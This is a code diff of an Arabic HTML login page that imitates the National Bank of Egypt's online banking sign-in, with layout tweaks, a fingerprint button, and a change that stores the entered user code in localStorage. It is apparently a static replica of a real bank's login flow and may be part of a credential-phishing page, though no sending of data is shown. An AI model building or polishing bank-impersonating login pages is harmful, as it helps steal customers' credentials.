@@ -11,10 +11,9 @@
 
 <header class="site-header">
     <div class="header-left">
-        <div class="menu-btn"><i class="fas fa-bars"></i></div>
         <a href="login_en.html" class="lang-switcher">
-            <span>English</span>
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
+            <span>English</span>
         </a>
     </div>
     <div class="header-right">
@@ -34,32 +33,46 @@
                 <span>أفراد</span>
             </div>
             <div class="type-card" onclick="toggleUserType(this)">
-                <i class="fas fa-building"></i>
+                <i class="fas fa-users"></i>
                 <span>شركات</span>
             </div>
         </div>
-
-        <div class="welcome-msg">أهلاً بك يا <span>lgguhfuughuy</span></div>
-        <h1 class="page-heading">كود المستخدم</h1>
 
         <section class="login-card">
             <div id="errorMessage" role="alert" style="display:none; color: red; margin-bottom: 10px;"></div>
             <form id="step1Form">
                 <div class="form-group">
-                    <label class="form-label">كود المستخدم</label>
-                    <div class="form-control-wrapper">
-                        <input type="text" id="username" name="username" class="form-control" placeholder="كود المستخدم" required autofocus>
-                    </div>
+                    <input type="text" id="username" name="username" class="form-control" placeholder="كود المستخدم" required autofocus>
                 </div>
                 <a href="#" class="forgot-link">نسيت كود المستخدم؟</a>
                 
-                <button type="submit" class="submit-btn" id="submitBtn">تسجيل الدخول</button>
+                <div class="submit-actions">
+                    <button type="submit" class="submit-btn" id="submitBtn">تسجيل الدخول</button>
+                    <button type="button" class="biometric-btn">
+                        <i class="fas fa-fingerprint"></i>
+                    </button>
+                </div>
             </form>
         </section>
 
         <div class="register-section">
             <a href="#" class="register-title">سجل الآن</a>
-            <p class="register-text">انضم إلى عملاء البنك الأهلي المصري</p>
+            <p class="register-text">انضم لعملاء البنك الاهلي المصري</p>
+        </div>
+
+        <div class="bottom-nav">
+            <a href="#" class="nav-item">
+                <i class="far fa-calendar-alt"></i>
+                <span>احجز موعد</span>
+            </a>
+            <a href="#" class="nav-item">
+                <i class="fas fa-map-marker-alt"></i>
+                <span>ماكينة الصراف الآلي / الفرع</span>
+            </a>
+            <a href="#" class="nav-item">
+                <i class="fas fa-calculator"></i>
+                <span>حاسبة العملات</span>
+            </a>
         </div>
     </div>
 </main>
@@ -74,6 +87,8 @@ document.getElementById('step1Form').addEventListener('submit', function(event) 
     event.preventDefault();
     const username = document.getElementById('username').value;
     const btn = document.getElementById('submitBtn');
+    
+    localStorage.setItem('temp_username', username);
     
     btn.disabled = true;
     btn.innerText = "جاري المعالجة...";
